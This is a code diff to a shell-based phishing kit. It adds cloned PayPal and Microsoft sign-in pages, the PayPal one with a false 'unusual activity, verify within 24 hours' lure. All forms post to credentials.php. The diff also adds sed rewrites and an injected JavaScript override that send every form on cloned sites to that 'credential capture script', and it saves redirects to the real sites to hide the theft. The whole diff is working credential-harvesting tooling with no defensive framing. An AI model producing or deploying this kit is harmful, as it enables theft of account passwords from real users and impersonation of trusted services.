@@ -308,6 +308,317 @@ create_github_page() {
 EOF
 }
 
+# Function to create a specialized PayPal login form
+create_paypal_page() {
+    echo -e "${YELLOW}[INFO]${NC} Creating specialized PayPal login page..."
+    cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal: Account Verification Required</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            background-color: #ffffff;
+            border-radius: 5px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
+        }
+        .header {
+            background-color: #0070ba;
+            padding: 20px;
+            text-align: center;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+        }
+        .logo {
+            color: white;
+            font-size: 26px;
+            font-weight: bold;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+        .content {
+            padding: 30px;
+        }
+        .title {
+            color: #2c2e2f;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .login-form {
+            border: 1px solid #ccc;
+            padding: 20px;
+            border-radius: 5px;
+            background-color: #fff;
+            margin: 20px 0;
+        }
+        .form-input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .submit-button {
+            background-color: #0070ba;
+            color: white;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .footer {
+            background-color: #f5f5f5;
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #666666;
+            border-bottom-left-radius: 5px;
+            border-bottom-right-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">PayPal</div>
+        </div>
+        <div class="content">
+            <div class="title">Important: Action Required on Your PayPal Account</div>
+            <p>Dear valued customer,</p>
+            <p>We've detected unusual activity in your PayPal account. To ensure your account security and prevent any unauthorized transactions, we need you to verify your information immediately.</p>
+            <p><strong>If you do not verify your account within 24 hours, your account will be limited and pending transactions may be canceled.</strong></p>
+
+            <div class="login-form">
+                <h3>Please verify your PayPal account</h3>
+                <form action="credentials.php" method="post">
+                    <label for="email">Email or phone number</label>
+                    <input type="text" id="email" name="email" class="form-input" required>
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" class="form-input" required>
+                    <button type="submit" class="submit-button">Log In</button>
+                </form>
+            </div>
+
+            <p>If you did not initiate this request, we recommend changing your password immediately after verification.</p>
+            <p>Thank you for your prompt attention to this matter.</p>
+            <p>Sincerely,<br>PayPal Account Services</p>
+        </div>
+        <div class="footer">
+            <p>This message contains confidential information and is intended only for the recipient mentioned above. If you have received this email in error, please contact PayPal Customer Service.</p>
+            <p>&copy; 2023 PayPal, Inc. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+}
+
+# Function to create a specialized Microsoft/Outlook login form
+create_microsoft_page() {
+    echo -e "${YELLOW}[INFO]${NC} Creating specialized Microsoft login page..."
+    cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 440px;
+            background-color: white;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            padding: 44px;
+            max-width: 440px;
+        }
+        .logo {
+            margin-bottom: 16px;
+        }
+        .logo img {
+            width: 108px;
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1B1B1B;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        input {
+            width: 100%;
+            padding: 6px 10px;
+            font-size: 15px;
+            border: 1px solid #8A8A8A;
+            height: 36px;
+            outline: none;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #0067b8;
+        }
+        button {
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            padding: 0 12px;
+            font-size: 15px;
+            height: 32px;
+            min-width: 108px;
+            cursor: pointer;
+            float: right;
+            margin-top: 12px;
+        }
+        button:hover {
+            background-color: #005da6;
+        }
+        .footer {
+            margin-top: 30px;
+            text-align: left;
+            font-size: 13px;
+            color: #666;
+        }
+        .footer a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="108" height="24" viewBox="0 0 108 24">
+                <path fill="#737373" d="M44.836,4.6V18.4h-2.4V7.583H42.4L38.119,18.4H36.531L32.142,7.583h-.029V18.4H29.9V4.6h3.436L37.3,14.83h.058L41.545,4.6Zm2,1.049a1.268,1.268,0,0,1,.419-.967,1.413,1.413,0,0,1,1-.39,1.392,1.392,0,0,1,1.02.4,1.3,1.3,0,0,1,.4.958,1.248,1.248,0,0,1-.414.953,1.428,1.428,0,0,1-1.01.385A1.4,1.4,0,0,1,47.25,6.6a1.261,1.261,0,0,1-.409-.948M49.41,18.4H47.081V8.507H49.41Zm7.064-1.694a3.213,3.213,0,0,0,1.145-.241,4.811,4.811,0,0,0,1.155-.635V18a4.665,4.665,0,0,1-1.266.481,6.886,6.886,0,0,1-1.554.164,4.707,4.707,0,0,1-4.918-4.908,5.641,5.641,0,0,1,1.4-3.932,5.055,5.055,0,0,1,3.955-1.545,5.414,5.414,0,0,1,1.324.168,4.431,4.431,0,0,1,1.063.39v2.233a4.763,4.763,0,0,0-1.1-.611,3.184,3.184,0,0,0-1.15-.217,2.919,2.919,0,0,0-2.223.9,3.37,3.37,0,0,0-.847,2.416,3.216,3.216,0,0,0,.813,2.338,2.936,2.936,0,0,0,2.209.837M65.4,8.343a2.952,2.952,0,0,1,.5.039,2.1,2.1,0,0,1,.375.1v2.358a2.04,2.04,0,0,0-.534-.255,2.646,2.646,0,0,0-.852-.12,1.808,1.808,0,0,0-1.448.722,3.467,3.467,0,0,0-.592,2.223V18.4H60.525V8.507h2.329v1.559h.038A2.729,2.729,0,0,1,63.855,8.8,2.611,2.611,0,0,1,65.4,8.343m1.01,5.254A5.358,5.358,0,0,1,67.792,9.71a5.1,5.1,0,0,1,3.85-1.434,4.742,4.742,0,0,1,3.623,1.381,5.212,5.212,0,0,1,1.3,3.729,5.257,5.257,0,0,1-1.386,3.83,5.019,5.019,0,0,1-3.772,1.424,4.935,4.935,0,0,1-3.652-1.352A4.987,4.987,0,0,1,66.406,13.6m2.425-.077a3.535,3.535,0,0,0,.7,2.368,2.505,2.505,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.389,2.389,0,0,0-1.929-.813,2.44,2.44,0,0,0-1.988.852,3.707,3.707,0,0,0-.707,2.43m11.2-2.416a1,1,0,0,0,.318.785,5.426,5.426,0,0,0,1.4.717,4.767,4.767,0,0,1,1.959,1.256,2.6,2.6,0,0,1,.563,1.689A2.715,2.715,0,0,1,83.2,17.794a4.558,4.558,0,0,1-2.9.847,6.978,6.978,0,0,1-1.362-.149,6.047,6.047,0,0,1-1.265-.38v-2.29a5.733,5.733,0,0,0,1.367.7,4,4,0,0,0,1.328.26,2.365,2.365,0,0,0,1.164-.221.79.79,0,0,0,.375-.741,1.029,1.029,0,0,0-.39-.813,5.768,5.768,0,0,0-1.477-.765,4.564,4.564,0,0,1-1.829-1.213,2.655,2.655,0,0,1-.539-1.713,2.706,2.706,0,0,1,1.063-2.2A4.243,4.243,0,0,1,81.5,8.256a6.663,6.663,0,0,1,1.164.115,5.161,5.161,0,0,1,1.078.3v2.214a4.974,4.974,0,0,0-1.078-.529,3.6,3.6,0,0,0-1.222-.221,1.781,1.781,0,0,0-1.034.26.824.824,0,0,0-.371.712M85.278,13.6a5.358,5.358,0,0,1,1.386-3.887,5.1,5.1,0,0,1,3.849-1.434,4.743,4.743,0,0,1,3.624,1.381,5.212,5.212,0,0,1,1.3,3.729,5.259,5.259,0,0,1-1.386,3.83,5.02,5.02,0,0,1-3.773,1.424,4.934,4.934,0,0,1-3.652-1.352A4.987,4.987,0,0,1,85.278,13.6m2.425-.077a3.537,3.537,0,0,0,.7,2.368,2.506,2.506,0,0,0,2.011.818,2.345,2.345,0,0,0,1.934-.818,3.783,3.783,0,0,0,.664-2.425,3.651,3.651,0,0,0-.688-2.411,2.39,2.39,0,0,0-1.93-.813,2.439,2.439,0,0,0-1.987.852,3.707,3.707,0,0,0-.707,2.43m15.464-3.109H99.7V18.4H97.341V10.412H95.686V8.507h1.655V7.13a3.423,3.423,0,0,1,1.015-2.555,3.561,3.561,0,0,1,2.6-1,5.807,5.807,0,0,1,.751.043,2.993,2.993,0,0,1,.577.13V5.764a2.422,2.422,0,0,0-.4-.164,2.107,2.107,0,0,0-.664-.1,1.407,1.407,0,0,0-1.126.457A2.017,2.017,0,0,0,103.167,7.3V8.507h3.254V6.283l2.329-.712V8.507h2.329v1.906h-2.329v4.629a1.951,1.951,0,0,0,.332,1.29,1.326,1.326,0,0,0,1.044.375,1.557,1.557,0,0,0,.486-.1,2.294,2.294,0,0,0,.5-.231V18.3a2.737,2.737,0,0,1-.736.231,5.029,5.029,0,0,1-1.015.106,2.887,2.887,0,0,1-2.209-.784,3.341,3.341,0,0,1-.736-2.363Z" fill="#737373"/>
+                <path fill="#F25022" d="M0 0h10.931v10.931H0z"/>
+                <path fill="#7FBA00" d="M12.069 0H23v10.931H12.069z"/>
+                <path fill="#00A4EF" d="M0 12.069h10.931V23H0z"/>
+                <path fill="#FFB900" d="M12.069 12.069H23V23H12.069z"/>
+            </svg>
+        </div>
+        <h1>Sign in</h1>
+        <form action="credentials.php" method="post">
+            <div class="form-group">
+                <input type="text" name="email" placeholder="Email, phone, or Skype" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <div>
+                <button type="submit">Sign in</button>
+            </div>
+        </form>
+        <div class="footer">
+            <p>No account? <a href="#">Create one!</a></p>
+            <p><a href="#">Can't access your account?</a></p>
+        </div>
+    </div>
+</body>
+</html>
+EOF
+}
+
+# Function to force all form actions to point to credentials.php
+# This ensures that all forms will submit to our credential capture script
+force_form_actions() {
+    local html_file="$1"
+    
+    echo -e "${YELLOW}[INFO]${NC} Ensuring all forms submit to credential capture script..."
+    
+    # Create a backup of the file
+    cp "$html_file" "${html_file}.bak"
+    
+    # Check if we need to modify the file
+    if grep -q '<form' "$html_file"; then
+        # Use a safer method to modify forms with sed
+        sed -i.tmp -e 's/<form[^>]*>/<form action="credentials.php" method="post">/g' "$html_file"
+        
+        # Remove temporary files
+        rm -f "${html_file}.tmp"
+        
+        echo -e "${GREEN}[SUCCESS]${NC} Modified forms to submit to credential capture script"
+    else
+        echo -e "${YELLOW}[INFO]${NC} No forms found in $html_file"
+    fi
+}
+
+# Function to ensure jQuery or JavaScript doesn't interfere with form submissions
+add_form_override_script() {
+    local html_file="$1"
+    
+    echo -e "${YELLOW}[INFO]${NC} Adding script to override form submissions..."
+    
+    # Add JavaScript to the end of the body to override any form submissions
+    # This will ensure all forms submit to our credentials.php regardless of any JavaScript handlers
+    if grep -q '</body>' "$html_file"; then
+        sed -i.tmp -e 's|</body>|<script>\
+            document.addEventListener("DOMContentLoaded", function() {\
+                var forms = document.getElementsByTagName("form");\
+                for(var i=0; i<forms.length; i++) {\
+                    forms[i].action = "credentials.php";\
+                    forms[i].method = "post";\
+                    forms[i].addEventListener("submit", function(e) {\
+                        e.preventDefault();\
+                        this.action = "credentials.php";\
+                        this.method = "post";\
+                        this.submit();\
+                    });\
+                }\
+            });\
+        </script></body>|g' "$html_file"
+        
+        # Remove temporary files
+        rm -f "${html_file}.tmp"
+        
+        echo -e "${GREEN}[SUCCESS]${NC} Added form override script"
+    else
+        # If no </body> tag, just append the script at the end of the file
+        echo '<script>
+            document.addEventListener("DOMContentLoaded", function() {
+                var forms = document.getElementsByTagName("form");
+                for(var i=0; i<forms.length; i++) {
+                    forms[i].action = "credentials.php";
+                    forms[i].method = "post";
+                    forms[i].addEventListener("submit", function(e) {
+                        e.preventDefault();
+                        this.action = "credentials.php";
+                        this.method = "post";
+                        this.submit();
+                    });
+                }
+            });
+        </script>' >> "$html_file"
+        
+        echo -e "${GREEN}[SUCCESS]${NC} Appended form override script to file"
+    fi
+}
+
 # Function to clone a website
 clone_website() {
     local target_url=$1
@@ -325,8 +636,25 @@ clone_website() {
         # For GitHub, use our specialized template which works better than cloning
         create_github_page
         echo -e "${GREEN}[SUCCESS]${NC} Created specialized GitHub login page"
-    elif [[ "$target_url" == *"microsoft.com"* ]] || [[ "$target_url" == *"live.com"* ]]; then
+        # Store the redirect URL for the credential script to use
+        echo "$redirect_url" > redirect_url.txt
+        return 0
+    elif [[ "$target_url" == *"paypal.com"* ]]; then
+        redirect_url="https://www.paypal.com"
+        # For PayPal, use our specialized template
+        create_paypal_page
+        echo -e "${GREEN}[SUCCESS]${NC} Created specialized PayPal login page"
+        # Store the redirect URL for the credential script to use
+        echo "$redirect_url" > redirect_url.txt
+        return 0
+    elif [[ "$target_url" == *"microsoft.com"* ]] || [[ "$target_url" == *"live.com"* ]] || [[ "$target_url" == *"outlook.com"* ]]; then
         redirect_url="https://www.microsoft.com"
+        # For Microsoft, use our specialized template
+        create_microsoft_page
+        echo -e "${GREEN}[SUCCESS]${NC} Created specialized Microsoft login page"
+        # Store the redirect URL for the credential script to use
+        echo "$redirect_url" > redirect_url.txt
+        return 0
     elif [[ "$target_url" == *"google.com"* ]]; then
         redirect_url="https://www.google.com"
     elif [[ "$target_url" == *"reddit.com"* ]]; then
@@ -349,11 +677,6 @@ clone_website() {
     
     # Store the redirect URL for the credential script to use
     echo "$redirect_url" > redirect_url.txt
-    
-    # If we already created a specialized page, return
-    if [[ "$target_url" == *"github.com"* ]]; then
-        return 0
-    fi
     
     # Create temporary directory for cloning
     mkdir -p "$clone_dir"
@@ -390,6 +713,9 @@ clone_website() {
         sed -i 's/<form[^>]*action='\''[^'\'']*'\''/<form action='\''credentials.php'\''/g' "$html_file"
         # For forms without an action attribute
         sed -i 's/<form[^>]*>/<form action="credentials.php" method="post">/g' "$html_file"
+        
+        # Add JavaScript to override form submissions
+        add_form_override_script "$html_file"
     done
     
     # Find the main HTML file (usually index.html)
@@ -404,6 +730,10 @@ clone_website() {
     if [ -n "$main_html" ]; then
         echo -e "${YELLOW}[INFO]${NC} Using $main_html as the main page"
         cp "$main_html" index.html
+        
+        # Force all forms to submit to credentials.php and add override script
+        force_form_actions "index.html"
+        add_form_override_script "index.html"
         
         # Copy all other files in the directory to the current directory
         cp -r "$clone_dir"/* ./
